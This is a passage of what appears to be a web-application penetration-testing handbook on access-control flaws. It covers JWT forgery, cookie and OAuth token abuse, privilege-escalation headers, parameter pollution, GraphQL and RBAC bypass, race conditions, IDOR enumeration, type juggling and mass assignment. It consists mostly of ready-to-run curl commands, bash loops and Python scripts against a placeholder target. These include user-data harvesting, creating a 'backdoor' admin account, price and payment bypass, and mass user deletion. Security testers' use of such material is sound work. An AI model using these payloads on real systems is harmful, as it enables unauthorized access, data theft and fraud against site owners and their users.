jwt_token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.signature"

# Split into components
echo "$jwt_token" | cut -d'.' -f2 | base64 -d
# Output: {"user_id":123,"role":"user"}

# Modify payload (if algorithm='none' vulnerability exists)
# Create new payload
echo -n '{"user_id":456,"role":"user"}' | base64 | tr -d '=' | tr '+/' '-_'

# Reconstruct token with 'none' algorithm
header='{"alg":"none","typ":"JWT"}'
header_encoded=$(echo -n "$header" | base64 | tr -d '=' | tr '+/' '-_')
payload_encoded=$(echo -n '{"user_id":456,"role":"user"}' | base64 | tr -d '=' | tr '+/' '-_')
forged_token="${header_encoded}.${payload_encoded}."

# Test with forged token
curl -H "Authorization: Bearer ${forged_token}" "https://target.com/api/profile"
```

**Using jwt_tool for comprehensive JWT attacks:**

```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Scan for vulnerabilities
python3 jwt_tool.py TARGET_JWT -M at -t "https://target.com/api/endpoint"

# Specific attack modes:
# Algorithm confusion (RS256 to HS256)
python3 jwt_tool.py TARGET_JWT -X k -pk public_key.pem

# Null signature
python3 jwt_tool.py TARGET_JWT -X n

# Modify claims
python3 jwt_tool.py TARGET_JWT -I -pc user_id -pv 456
```

**Cookie Manipulation:**

```bash
# Inspect cookies in browser DevTools or proxy
# Look for user identifiers
document.cookie  # In browser console

# Common vulnerable cookie patterns
user_id=123
username=alice
account=MTIz  # Base64 encoded '123'

# Modify and replay
curl "https://target.com/dashboard" \
     -H "Cookie: user_id=456; session=abc123xyz"

# Using cookie poisoning in HTTP requests
# Testing for signed vs unsigned cookies
curl "https://target.com/admin" \
     -H "Cookie: role=admin" \
     # If accepted, cookie lacks integrity checks
```

**OAuth/SSO Token Reuse:**

[Inference] OAuth implementations may allow token reuse across accounts if validation is insufficient:

```bash
# Capture OAuth callback with victim's authorization code
# Example: https://target.com/callback?code=VICTIM_CODE&state=xyz

# Replay on attacker's session
curl "https://target.com/callback?code=VICTIM_CODE&state=ATTACKER_STATE" \
     -H "Cookie: session=ATTACKER_SESSION"

# Testing for code reuse vulnerabilities
# 1. Complete OAuth flow, capture code
# 2. Use code multiple times
# 3. Use code after timeout period
```

## Vertical Privilege Escalation

Vertical privilege escalation involves gaining higher privileges than originally granted, typically from regular user to administrator or from guest to authenticated user.

**Direct Administrative Access Testing:**

```bash
# Test common admin paths without authentication
admin_paths=(
    "/admin"
    "/administrator"
    "/admin.php"
    "/admin/dashboard"
    "/wp-admin"
    "/manage"
    "/control-panel"
    "/backend"
)

for path in "${admin_paths[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}")
    echo "${path}: ${response}"
done

# Using ffuf for admin path discovery
ffuf -u "https://target.com/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/admin-panels.txt \
     -mc 200,301,302,401,403
```

**Parameter Pollution for Privilege Escalation:**

```bash
# Single parameter with array values
curl -X POST "https://target.com/register" \
     -d "username=attacker&role=user&role=admin"

# JSON array injection
curl -X POST "https://target.com/api/user" \
     -H "Content-Type: application/json" \
     -d '{"username":"attacker","roles":["user","admin"]}'

# Testing with conflicting parameters
curl -X POST "https://target.com/update" \
     -d "user_id=123&privilege=user&privilege=admin"
```

**HTTP Verb Tampering:**

Different HTTP methods may bypass authorization:

```bash
# Standard request denied
curl -X GET "https://target.com/admin/users" \
     -H "Cookie: session=user_session"
     # Response: 403 Forbidden

# Try alternative methods
methods=("POST" "PUT" "DELETE" "PATCH" "HEAD" "OPTIONS" "TRACE")

for method in "${methods[@]}"; do
    echo "Testing $method:"
    curl -X "$method" "https://target.com/admin/users" \
         -H "Cookie: session=user_session" \
         -i | head -n 1
done

# Using Burp Repeater:
# Right-click request â†’ Change request method
```

**Header Injection for Privilege Escalation:**

```bash
# Common privilege escalation headers
curl "https://target.com/admin/panel" \
     -H "X-Original-URL: /admin/panel" \
     -H "X-Rewrite-URL: /admin/panel" \
     -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Custom-IP-Authorization: 127.0.0.1" \
     -H "X-Originating-IP: 127.0.0.1"

# Administrative role headers
curl "https://target.com/dashboard" \
     -H "X-Role: admin" \
     -H "X-Admin: true" \
     -H "X-Privilege: admin"

# Testing with multiple header combinations
curl "https://target.com/api/sensitive" \
     -H "Cookie: session=user_token" \
     -H "X-User-Role: admin" \
     -H "Authorization: Bearer user_token"
```

**Path Manipulation Techniques:**

```bash
# URL path traversal to admin endpoints
curl "https://target.com/user/../admin/config"
curl "https://target.com/user/%2e%2e/admin/config"  # URL encoded
curl "https://target.com/user/....//admin/config"   # Double encoding bypass

# Using Burp Collaborator to detect blind SSRF
curl "https://target.com/fetch?url=http://BURP_COLLABORATOR_SUBDOMAIN.burpcollaborator.net"

# Testing URL parameter override
curl "https://target.com/public?page=../../admin/secrets"
```

**GraphQL Privilege Escalation:**

GraphQL APIs may expose privileged operations:

```bash
# Introspection query to discover schema
curl -X POST "https://target.com/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query":"query IntrospectionQuery { __schema { types { name fields { name } } } }"}'

# Testing mutation for privilege escalation
curl -X POST "https://target.com/graphql" \
     -H "Content-Type: application/json" \
     -d '{
       "query":"mutation { updateUser(id: 123, role: \"admin\") { id role } }"
     }'

# Query batching to bypass rate limits
curl -X POST "https://target.com/graphql" \
     -H "Content-Type: application/json" \
     -d '[
       {"query":"mutation { deleteUser(id: 1) }"},
       {"query":"mutation { deleteUser(id: 2) }"},
       {"query":"mutation { deleteUser(id: 3) }"}
     ]'
```

## Role-Based Access Control (RBAC) Bypass

RBAC systems assign permissions based on roles. Bypasses exploit inconsistencies in role validation, assignment, or enforcement.

**Role Enumeration:**

```bash
# Identify available roles through API responses
curl "https://target.com/api/user/profile" \
     -H "Cookie: session=user_token" | jq .

# Example response reveals roles
{
  "user_id": 123,
  "username": "testuser",
  "roles": ["user", "subscriber"],
  "available_roles": ["user", "subscriber", "moderator", "admin"]
}

# Test role modification
curl -X PUT "https://target.com/api/user/profile" \
     -H "Content-Type: application/json" \
     -H "Cookie: session=user_token" \
     -d '{"roles":["user","admin"]}'
```

**Role Injection Techniques:**

```bash
# JSON parameter pollution
curl -X POST "https://target.com/api/assign-role" \
     -H "Content-Type: application/json" \
     -d '{"user_id":123,"role":"admin"}'

# Array-based role injection
curl -X POST "https://target.com/api/update-profile" \
     -H "Content-Type: application/json" \
     -d '{"username":"attacker","roles":["user"],"roles":["admin"]}'

# Nested object role injection
curl -X POST "https://target.com/api/user" \
     -H "Content-Type: application/json" \
     -d '{
       "profile": {
         "name": "attacker",
         "settings": {
           "role": "admin"
         }
       }
     }'
```

**Exploiting Role Hierarchy Gaps:**

[Inference] Applications may fail to validate role hierarchies consistently:

```bash
# Escalate through intermediate roles
# user â†’ moderator â†’ admin

# Step 1: Assign moderator role
curl -X POST "https://target.com/api/promote" \
     -d "role=moderator" \
     -H "Cookie: session=user_token"

# Step 2: Use moderator privileges to escalate further
curl -X POST "https://target.com/api/admin/promote" \
     -d "target_user=self&role=admin" \
     -H "Cookie: session=moderator_token"
```

**Testing Role Inheritance:**

```bash
# Create user with multiple roles
curl -X POST "https://target.com/api/register" \
     -H "Content-Type: application/json" \
     -d '{
       "username": "test",
       "password": "pass123",
       "roles": ["user", "guest", "admin"]
     }'

# Test if highest privilege takes effect
curl "https://target.com/admin/panel" \
     -H "Cookie: session=new_user_session"
```

**Context-Based Role Bypass:**

```bash
# Testing role context switching
# Access resource in different organizational contexts

# As user in Organization A
curl "https://target.com/org/A/admin/users" \
     -H "Cookie: session=user_token; org_context=A"
     # Response: 403 Forbidden

# Switch organization context
curl "https://target.com/org/B/admin/users" \
     -H "Cookie: session=user_token; org_context=B"
     # May succeed if role validation is context-dependent
```

**Using Autorize (Burp Extension):**

Autorize automates testing for authorization bypasses:

```
1. Install from BApp Store in Burp Suite
2. Configure roles:
   - Add low-privileged user session token
   - Add high-privileged user session token
3. Browse application as high-privileged user
4. Autorize replays requests with low-privileged token
5. Review results for unauthorized access
```

## Function-Level Access Control Bypass

Function-level access control restricts access to specific operations or endpoints. Bypasses occur when validation is missing or improperly implemented at the function/API endpoint level.

**API Endpoint Discovery:**

```bash
# Using API fuzzing wordlists
ffuf -u "https://target.com/api/v1/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc 200,201,204,301,302,401,403

# JavaScript file analysis for endpoint discovery
curl -s "https://target.com/js/app.js" | grep -oP 'api/[a-zA-Z0-9/_-]+' | sort -u

# Using LinkFinder
python3 linkfinder.py -i "https://target.com" -o cli

# Burp Suite Spider/Crawler with authenticated session
# Target â†’ Site map â†’ Right-click domain â†’ Spider this host
```

**Undocumented API Testing:**

```bash
# Common REST API patterns
endpoints=(
    "/api/v1/users"
    "/api/v1/admin/users"
    "/api/v2/users"
    "/api/internal/users"
    "/api/debug/users"
)

# Test with different authentication levels
for endpoint in "${endpoints[@]}"; do
    echo "Testing: $endpoint"
    
    # No auth
    curl -s -o /dev/null -w "%{http_code}" "https://target.com${endpoint}"
    
    # With auth
    curl -s -o /dev/null -w "%{http_code}" "https://target.com${endpoint}" \
         -H "Authorization: Bearer USER_TOKEN"
done
```

**Function Parameter Manipulation:**

```bash
# Delete function with insufficient validation
curl -X DELETE "https://target.com/api/user/123" \
     -H "Cookie: session=user_token"
     # Attempt to delete other users

# Modify function with elevated permissions
curl -X PUT "https://target.com/api/article/456" \
     -H "Content-Type: application/json" \
     -d '{"status":"published","featured":true}' \
     # Regular user modifying admin-only fields

# Batch operations bypass
curl -X POST "https://target.com/api/users/delete" \
     -H "Content-Type: application/json" \
     -d '{"user_ids":[1,2,3,4,5]}'
     # Deleting multiple users at once
```

**API Version Bypass:**

Older API versions may lack security patches:

```bash
# Test different API versions
versions=("v1" "v2" "v3" "beta" "internal" "debug")

for version in "${versions[@]}"; do
    curl "https://target.com/api/${version}/admin/config" \
         -H "Cookie: session=user_token" \
         -w "\nVersion ${version}: %{http_code}\n"
done

# Testing deprecated endpoints
curl "https://target.com/api/deprecated/user/promote" \
     -X POST \
     -d "role=admin"
```

**Hidden Parameter Discovery:**

```bash
# Param miner in Burp Suite (BApp Store extension)
# Automatically discovers hidden parameters

# Manual parameter guessing
common_params=(
    "debug=1"
    "admin=true"
    "role=admin"
    "privilege=high"
    "access_level=admin"
    "is_admin=1"
)

for param in "${common_params[@]}"; do
    curl "https://target.com/api/sensitive?${param}" \
         -H "Cookie: session=user_token"
done
```

**Testing Administrative Functions Without UI:**

```bash
# Direct API calls to admin functions
# User management
curl -X POST "https://target.com/api/admin/create-user" \
     -H "Content-Type: application/json" \
     -H "Cookie: session=user_token" \
     -d '{
       "username": "backdoor",
       "password": "pass123",
       "role": "admin"
     }'

# Configuration changes
curl -X PUT "https://target.com/api/admin/settings" \
     -H "Content-Type: application/json" \
     -H "Cookie: session=user_token" \
     -d '{"maintenance_mode":false,"debug":true}'

# Database operations
curl -X POST "https://target.com/api/admin/execute-query" \
     -H "Content-Type: application/json" \
     -H "Cookie: session=user_token" \
     -d '{"query":"SELECT * FROM users WHERE role=admin"}'
```

**Race Condition Exploitation:**

Time-of-check to time-of-use (TOCTOU) vulnerabilities:

```bash
# Python script for race condition testing
import requests
import threading

def exploit_race():
    session = requests.Session()
    session.cookies.set('session', 'user_token')
    
    url = "https://target.com/api/transfer"
    data = {"from": "user_account", "to": "attacker_account", "amount": 100}
    
    # Send multiple simultaneous requests
    threads = []
    for i in range(10):
        t = threading.Thread(target=lambda: session.post(url, json=data))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

exploit_race()
```

Using Turbo Intruder for high-speed race conditions:

```python
# Turbo Intruder script (in Burp Suite)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)
    
    # Queue 50 identical requests
    for i in range(50):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

**WebSocket Authorization Testing:**

WebSockets may bypass HTTP-based authorization:

```bash
# Using websocat
websocat ws://target.com/ws -H="Cookie: session=user_token"

# Send privileged commands
> {"action":"delete_user","user_id":456}
> {"action":"modify_role","user_id":123,"role":"admin"}
> {"action":"broadcast","message":"test","admin":true}
```

**Key Tools Summary:**

- **Burp Suite Pro**: Intruder, Repeater, Autorize extension, Param Miner
- **ffuf**: Fast web fuzzer for endpoint/parameter discovery
- **jwt_tool**: Comprehensive JWT vulnerability testing
- **wfuzz**: Web application fuzzer
- **Postman/Insomnia**: API testing and manipulation
- **Python requests**: Custom automation scripts
- **Turbo Intruder**: High-speed race condition testing
- **websocat**: WebSocket client for CLI testing

---

**Important Related Topics:**

- **Session Management Vulnerabilities**: Session fixation, session hijacking, token entropy analysis
- **Authentication Bypass Techniques**: SQL injection auth bypass, NoSQL injection, LDAP injection
- **API Security Testing**: REST, GraphQL, SOAP specific vulnerabilities
- **Client-Side Access Control**: JavaScript authorization bypass, DOM manipulation
- **Server-Side Request Forgery (SSRF)**: Internal service access via vulnerable applications

---

## Missing Authorization Checks

### Identification Techniques

**Horizontal Privilege Escalation Detection:**

Access control failures where users can access resources belonging to other users at the same privilege level.

```bash
# Test account enumeration
# Login as user1 (ID: 1001)
curl -H "Cookie: session=user1_token" \
  http://target.com/api/profile?user_id=1001

# Attempt to access user2's data (ID: 1002)
curl -H "Cookie: session=user1_token" \
  http://target.com/api/profile?user_id=1002

# If returns user2's data â†’ Missing authorization check
```

**Vertical Privilege Escalation Detection:**

Access control failures where low-privileged users can access admin/privileged functions.

```bash
# Login as regular user
curl -H "Cookie: session=regular_user_token" \
  http://target.com/admin/dashboard

# Attempt admin functions
curl -X POST -H "Cookie: session=regular_user_token" \
  -d "username=newadmin&role=admin" \
  http://target.com/admin/users/create

# If successful â†’ Missing authorization check
```

### Common Vulnerable Patterns

**Insecure Direct Object References (IDOR):**

```bash
# Profile access
/user/profile/1234
/api/users/1234
/account/details?id=1234

# Document access
/documents/view/5678
/files/download?file_id=5678
/api/documents/5678

# Order/transaction access
/orders/9012
/transactions/view?transaction_id=9012
/api/invoices/9012
```

**Missing Function-Level Access Control:**

```bash
# Admin endpoints without proper checks
/admin/users
/admin/settings
/admin/logs
/api/admin/dashboard

# Privileged operations
/api/users/delete
/api/users/promote
/api/system/configure

# Hidden admin panels
/administrator
/manage
/control-panel
/wp-admin
```

### Systematic Testing Methodology

**Step 1: Map Application Endpoints**

```bash
# Spider application with authenticated user
# Burp Suite: Target â†’ Site map
# Or use command-line tools

# Extract all endpoints
grep -oP '(https?://[^"]+)' sitemap.txt | sort -u > endpoints.txt

# Categorize by privilege level
grep -i 'admin' endpoints.txt > admin_endpoints.txt
grep -i 'user' endpoints.txt > user_endpoints.txt
```

**Step 2: Identify Reference Patterns**

```bash
# Extract ID parameters
grep -oP '(\?|&)(id|user_id|account_id|doc_id)=[0-9]+' requests.txt

# Extract UUID patterns
grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' requests.txt

# Extract sequential identifiers
# Numeric: 1, 2, 3, 1000, 1001
# Base64: MQ==, Mg==, Mw==
# Hash-like: short hashes that may be sequential
```

**Step 3: Test with Different Authorization Contexts**

```bash
# Create test matrix
# Context 1: No authentication
# Context 2: Authenticated as User A
# Context 3: Authenticated as User B
# Context 4: Authenticated as Admin

# Test each endpoint in each context
for endpoint in $(cat endpoints.txt); do
  echo "Testing: $endpoint"
  
  # No auth
  curl -i "$endpoint" 2>&1 | head -1
  
  # User A
  curl -i -H "Cookie: session=userA_token" "$endpoint" 2>&1 | head -1
  
  # User B
  curl -i -H "Cookie: session=userB_token" "$endpoint" 2>&1 | head -1
  
  # Admin
  curl -i -H "Cookie: session=admin_token" "$endpoint" 2>&1 | head -1
done
```

**Step 4: Automated IDOR Testing**

```python
import requests
import itertools

target = "http://target.com/api/documents/"
user_a_session = "sessionA_token"
user_b_session = "sessionB_token"

# Test ID range
for doc_id in range(1, 1000):
    # User A accessing User B's resources
    headers = {'Cookie': f'session={user_a_session}'}
    r = requests.get(f"{target}{doc_id}", headers=headers)
    
    if r.status_code == 200:
        print(f"[POTENTIAL IDOR] User A accessed document {doc_id}")
        
        # Verify it belongs to User B
        headers_b = {'Cookie': f'session={user_b_session}'}
        r_b = requests.get(f"{target}{doc_id}", headers=headers_b)
        
        if r_b.status_code == 200:
            # Compare responses to confirm ownership
            if r.text == r_b.text:
                print(f"[CONFIRMED IDOR] Document {doc_id} belongs to User B but accessible by User A")
```

### Testing Admin Panel Access

**Forced Browsing Script:**

```bash
#!/bin/bash

# Common admin paths
admin_paths=(
    "admin"
    "administrator"
    "admin.php"
    "admin/"
    "admin/index.php"
    "admin/dashboard"
    "manage"
    "management"
    "control-panel"
    "cpanel"
    "webadmin"
    "adminpanel"
    "admin1"
    "admin2"
    "moderator"
    "adminarea"
    "adminLogin"
    "admin_area"
    "admin-login"
    "admin/login"
    "admin/admin"
    "admin/home"
    "admin_home"
    "adminHome"
    "admin-console"
    "admin/console"
)

target="http://target.com"
session_cookie="regular_user_session"

for path in "${admin_paths[@]}"; do
    url="$target/$path"
    echo "Testing: $url"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" \
               -H "Cookie: session=$session_cookie" \
               "$url")
    
    if [ "$response" = "200" ]; then
        echo "[FOUND] $url returned 200 OK"
    elif [ "$response" = "302" ] || [ "$response" = "301" ]; then
        echo "[REDIRECT] $url returned $response"
    fi
done
```

**Burp Suite Configuration:**

```
1. Proxy â†’ Options â†’ Match and Replace
   - Add rule to test without authentication
   - Type: Request header
   - Match: Cookie: session=.*
   - Replace: (empty)

2. Intruder â†’ Positions
   - Target: admin endpoints
   - Clear all positions
   - Add position at resource ID

3. Intruder â†’ Payloads
   - Payload type: Numbers
   - From: 1, To: 10000, Step: 1

4. Intruder â†’ Options â†’ Grep - Match
   - Add strings indicating successful access:
     * "profile"
     * "document"
     * "success"
     * User-specific data patterns
```

### API-Specific Testing

**GraphQL Authorization Bypass:**

```graphql
# Query for other users' data
query {
  user(id: 1001) {
    username
    email
    privateNotes
    sensitiveData
  }
}

# Test introspection for admin queries
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Admin mutation without proper authorization
mutation {
  deleteUser(userId: 1002) {
    success
  }
}
```

**REST API Testing:**

```bash
# Test different HTTP methods
for method in GET POST PUT DELETE PATCH; do
  curl -X $method \
    -H "Cookie: session=user_token" \
    http://target.com/api/admin/users/1234
done

# Test with modified Content-Type
curl -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=user_token" \
  -d '{"userId":1234,"action":"delete"}' \
  http://target.com/api/users

# Same request as URL-encoded
curl -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=user_token" \
  -d "userId=1234&action=delete" \
  http://target.com/api/users
```

### Mobile API Authorization Testing

**Intercept Mobile Traffic:**

```bash
# Setup proxy
adb shell settings put global http_proxy <KALI_IP>:8080

# Or use Genymotion + Burp
# Configure certificate: Settings â†’ Security â†’ Install from storage

# Test API endpoints discovered from mobile app
curl -X GET \
  -H "Authorization: Bearer <mobile_token>" \
  -H "User-Agent: MobileApp/1.0" \
  http://api.target.com/v1/users/1234/sensitive_data
```

## Parameter Manipulation

### Direct Parameter Tampering

**Price/Quantity Manipulation:**

```bash
# Original request
curl -X POST \
  -d "item_id=123&quantity=1&price=100.00" \
  http://target.com/checkout

# Modified price
curl -X POST \
  -d "item_id=123&quantity=1&price=0.01" \
  http://target.com/checkout

# Negative quantity (refund attack)
curl -X POST \
  -d "item_id=123&quantity=-1&price=100.00" \
  http://target.com/checkout
```

**Role/Permission Parameter Injection:**

```bash
# Registration with injected role
curl -X POST \
  -d "username=attacker&password=pass123&role=admin" \
  http://target.com/register

# Alternative parameter names
curl -X POST \
  -d "username=attacker&password=pass123&isAdmin=true" \
  http://target.com/register

curl -X POST \
  -d "username=attacker&password=pass123&user_type=administrator" \
  http://target.com/register

# JSON format
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass123","role":"admin"}' \
  http://target.com/api/register
```

**Boolean Parameter Manipulation:**

```bash
# Bypass purchase verification
curl -X POST \
  -d "course_id=123&user_id=456&purchased=true" \
  http://target.com/api/courses/enroll

# Bypass payment verification
curl -X POST \
  -d "order_id=789&paid=true&verified=1" \
  http://target.com/api/orders/complete

# Bypass email verification
curl -X POST \
  -d "user_id=456&email_verified=true" \
  http://target.com/api/users/update
```

### HTTP Parameter Pollution (HPP)

**Duplicate Parameter Exploitation:**

```bash
# Test how application handles duplicate parameters
# Scenario: Admin panel checks admin=false, but we add admin=true

# First admin=false, then admin=true
curl "http://target.com/panel?admin=false&admin=true"

# Using POST parameters
curl -X POST \
  -d "admin=false&admin=true" \
  http://target.com/panel

# Mixed GET and POST
curl -X POST \
  -d "admin=true" \
  "http://target.com/panel?admin=false"
```

**Backend-Specific HPP Behavior:**

```bash
# PHP: Uses last value
?param=value1&param=value2  â†’ param=value2

# ASP.NET: Concatenates with comma
?param=value1&param=value2  â†’ param=value1,value2

# Java Servlets: Uses first value
?param=value1&param=value2  â†’ param=value1

# Python/Django: Uses last value
?param=value1&param=value2  â†’ param=value2

# Node.js/Express: Creates array
?param=value1&param=value2  â†’ param=[value1, value2]
```

**HPP Exploitation Example:**

```bash
# Application code (vulnerable):
# if (request.getParameter("admin") == "false") {
#     // allow access if second "admin" parameter is checked separately
# }

# Exploit
curl "http://target.com/admin?admin=false&admin=true"

# If backend uses first value for authorization but last value for logic
# Authorization check: admin=false (passes)
# Logic check: admin=true (grants admin access)
```

### Array Parameter Injection

**Exploiting Array Parameters:**

```bash
# Original request
curl -X POST \
  -d "user_ids[]=123" \
  http://target.com/api/users/delete

# Inject additional IDs
curl -X POST \
  -d "user_ids[]=123&user_ids[]=456&user_ids[]=789" \
  http://target.com/api/users/delete

# JSON array injection
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"user_ids":[123,456,789,1001,1002]}' \
  http://target.com/api/users/delete
```

**Wildcard Injection:**

```bash
# If application uses wildcards without validation
curl -X GET \
  "http://target.com/api/users?id=*" \
  # May return all users

curl -X POST \
  -d "delete_users=*" \
  http://target.com/admin/users/bulk_delete
  # May delete all users
```

### Hidden Parameter Discovery

**Parameter Mining Techniques:**

```bash
# Common parameter wordlist
common_params=(
    "admin"
    "debug"
    "test"
    "role"
    "user_type"
    "privilege"
    "access_level"
    "isAdmin"
    "is_admin"
    "authenticated"
    "verified"
    "premium"
    "paid"
    "discount"
    "price"
    "amount"
)

# Test each parameter
for param in "${common_params[@]}"; do
    curl "http://target.com/api/endpoint?$param=true"
    curl "http://target.com/api/endpoint?$param=1"
    curl "http://target.com/api/endpoint?$param=admin"
done
```

**Automated Parameter Discovery:**

```bash
# Using Arjun
python3 arjun.py -u http://target.com/api/endpoint

# Using ParamSpider
python3 paramspider.py -d target.com

# Using ffuf
ffuf -w parameters.txt \
  -u "http://target.com/api/endpoint?FUZZ=1" \
  -mc 200,301,302 \
  -H "Cookie: session=token"

# Using wfuzz
wfuzz -w parameters.txt \
  -u "http://target.com/api/endpoint?FUZZ=1" \
  --hc 404
```

**Parameter Fuzzing with Burp Intruder:**

```
1. Send request to Intruder
2. Clear positions
3. Add position after ? or &: ?Â§paramÂ§=value
4. Payload type: Runtime file
5. Load wordlist: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
6. Options â†’ Grep - Match: Add success indicators
7. Start attack
8. Analyze responses for different lengths/codes
```

### Type Juggling Attacks

**PHP Type Juggling:**

```bash
# Loose comparison vulnerabilities (== instead of ===)

# Boolean bypass
# if ($isPaid == true)
curl -X POST -d "isPaid=1" http://target.com/api/verify
curl -X POST -d "isPaid=yes" http://target.com/api/verify
curl -X POST -d "isPaid=on" http://target.com/api/verify

# Numeric string comparison
# if ($userId == "123")
curl -X POST -d "userId=123abc" http://target.com/api/check
# "123abc" == "123" evaluates to true in PHP

# Null byte injection
curl -X POST -d "role=user%00admin" http://target.com/api/check

# Array injection
curl -X POST -d "price[]=0" http://target.com/checkout
# Array compared to number may evaluate to true
```

**JSON Type Confusion:**

```bash
# String to boolean
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"admin":"true"}' \
  http://target.com/api/update

# String to number
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"price":"0.01"}' \
  http://target.com/api/checkout

# Null injection
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"role":null}' \
  http://target.com/api/update
  # May bypass validation if code checks for existence but not value
```

## Predictable IDs

### Sequential ID Enumeration

**Basic ID Enumeration:**

```bash
# Sequential user IDs
for id in {1..1000}; do
  curl -H "Cookie: session=token" \
    "http://target.com/api/users/$id" \
    >> results.txt
done

# Analyze results
grep -i "email\|username\|profile" results.txt

# Extract sensitive data
grep -oP '"email":"[^"]+' results.txt | cut -d'"' -f4
```

**Efficient Enumeration with Parallel Requests:**

```bash
# Using GNU parallel
seq 1 10000 | parallel -j 50 \
  'curl -s -H "Cookie: session=token" \
   http://target.com/api/users/{} | grep -q "username" && echo "ID {} exists"'

# Using xargs
seq 1 10000 | xargs -P 50 -I {} \
  curl -s -H "Cookie: session=token" \
   "http://target.com/api/users/{}" \
   -o "user_{}.json"
```

**Python Enumeration Script:**

```python
import requests
import concurrent.futures
import json

target = "http://target.com/api/users/"
session_cookie = "session_token"
headers = {'Cookie': f'session={session_cookie}'}

def check_id(user_id):
    try:
        r = requests.get(f"{target}{user_id}", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {
                'id': user_id,
                'data': data,
                'status': 'found'
            }
    except:
        pass
    return {'id': user_id, 'status': 'not_found'}

# Enumerate IDs 1-10000 with 50 concurrent threads
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    results = executor.map(check_id, range(1, 10001))

# Save results
found_users = [r for r in results if r['status'] == 'found']
with open('enumerated_users.json', 'w') as f:
    json.dump(found_users, f, indent=2)

print(f"Found {len(found_users)} users")
```

### Non-Sequential ID Pattern Recognition

**UUID/GUID Analysis:**

```bash
# Collect multiple UUIDs
# Sample UUIDs:
# 550e8400-e29b-41d4-a716-446655440000
# 550e8400-e29b-41d4-a716-446655440001
# 550e8400-e29b-41d4-a716-446655440002

# Check for sequential patterns in last segment
# If pattern exists, enumerate:
uuid_prefix="550e8400-e29b-41d4-a716-4466554400"
for i in {00..ff}; do
  uuid="${uuid_prefix}${i}"
  curl -H "Cookie: session=token" \
    "http://target.com/api/documents/$uuid"
done
```

**Timestamp-Based ID Detection:**

```bash
# If IDs appear to be timestamps
# Example: 1634567890123 (Unix timestamp in milliseconds)

# Current timestamp
current=$(date +%s)000

# Enumerate recent IDs (last 30 days)
start=$((current - 2592000000))
for ((id=start; id<=current; id+=60000)); do
  curl "http://target.com/api/orders/$id" >> orders.txt
done
```

**Hash-Based ID Analysis:**

```bash
# If IDs are hashes (MD5, SHA1)
# Check if they're hashes of sequential numbers

# Generate hash range
for i in {1..1000}; do
  md5=$(echo -n "$i" | md5sum | cut -d' ' -f1)
  echo "$i:$md5" >> hash_map.txt
  
  curl "http://target.com/api/resources/$md5" >> results.txt
done

# For base64 encoded IDs
for i in {1..1000}; do
  b64=$(echo -n "$i" | base64)
  curl "http://target.com/api/items/$b64"
done
```

### ID Prediction Analysis

**Collect and Analyze ID Samples:**

```python
import re
from collections import Counter

# Sample IDs collected
ids = [
    "USER_1001",
    "USER_1002", 
    "USER_1003",
    "DOC_2001",
    "DOC_2002"
]

# Extract patterns
patterns = []
for id_val in ids:
    # Extract prefix
    prefix = re.match(r'([A-Z]+)_', id_val)
    if prefix:
        patterns.append(prefix.group(1))
    
    # Extract numeric part
    numeric = re.search(r'(\d+)$', id_val)
    if numeric:
        print(f"ID: {id_val}, Numeric: {numeric.group(1)}")

# Predict next IDs
if patterns:
    common_prefix = Counter(patterns).most_common(1)[0][0]
    print(f"Common prefix: {common_prefix}")
    
    # Generate predictions
    for i in range(1000, 2000):
        predicted_id = f"{common_prefix}_{i}"
        print(predicted_id)
```

### Burp Suite Techniques

**Intruder Configuration for ID Enumeration:**

```
1. Intercept request with ID parameter
   GET /api/users/1234 HTTP/1.1

2. Send to Intruder (Ctrl+I)

3. Positions tab:
   - Attack type: Sniper
   - Clear all positions
   - Highlight ID: /api/users/Â§1234Â§

4. Payloads tab:
   - Payload type: Numbers
   - Number range: 1 to 100000
   - Step: 1
   
   OR for non-sequential:
   - Payload type: Custom iterator
   - Position 1: PREFIX_
   - Position 2: 0000-9999

5. Options tab:
   - Grep - Match: Add success indicators
     * "username"
     * "email"
     * "profile"
   - Grep - Extract: Extract specific fields
     * Start: "username":"
     * End: "

6. Resource Pool:
   - Concurrent requests: 10-50
   - Delay: 0ms (or add delay to avoid rate limiting)

7. Start attack

8. Results â†’ Filter by:
   - Status code: 200
   - Length variations
   - Grep match hits
```

**Sequencer Analysis:**

```
1. Capture multiple ID values (20-100 samples)
2. Send to Sequencer
3. Select token location
4. Start live capture or use existing samples
5. Analyze results:
   - Overall result: Quality score
   - Character-level analysis
   - Bit-level analysis
   - Effective entropy

If entropy is low â†’ IDs are predictable
```

## Mass Assignment Vulnerabilities

### Concept Overview

Mass assignment occurs when applications automatically bind user input to internal objects without filtering, allowing attackers to modify unintended object properties.

### Identification Techniques

**Object Property Discovery:**

```bash
# Registration request (legitimate)
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass","email":"user@example.com"}' \
  http://target.com/api/register

# Response may leak object structure
{
  "id": 1234,
  "username": "user",
  "email": "user@example.com",
  "role": "user",
  "isActive": true,
